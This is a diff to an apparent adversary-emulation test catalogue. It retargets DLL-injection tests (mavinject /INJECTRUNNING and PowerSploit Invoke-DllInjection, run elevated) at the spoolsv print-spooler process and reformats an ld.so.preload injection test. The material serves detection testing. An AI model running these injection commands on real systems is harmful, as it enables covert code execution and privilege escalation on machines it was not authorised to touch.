@@ -9640,13 +9640,13 @@ defense-evasion:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
     - name: Process Injection via PowerSploit
       description: 'PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
 
@@ -9661,19 +9661,18 @@ defense-evasion:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
     - name: Shared Library Injection via /etc/ld.so.preload
-      description: 'This test adds a shared library to the `ld.so.preload` list to
+      description: "This test adds a shared library to the `ld.so.preload` list to
         execute and intercept API calls. This technique was used by threat actor Rocke
         during the exploitation of Linux web servers. This requires the `glibc` package.
-
-'
+        \n"
       supported_platforms:
       - linux
       input_arguments:
@@ -13005,13 +13004,13 @@ privilege-escalation:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
     - name: Process Injection via PowerSploit
       description: 'PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
 
@@ -13026,19 +13025,18 @@ privilege-escalation:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
     - name: Shared Library Injection via /etc/ld.so.preload
-      description: 'This test adds a shared library to the `ld.so.preload` list to
+      description: "This test adds a shared library to the `ld.so.preload` list to
         execute and intercept API calls. This technique was used by threat actor Rocke
         during the exploitation of Linux web servers. This requires the `glibc` package.
-
-'
+        \n"
       supported_platforms:
       - linux
       input_arguments:
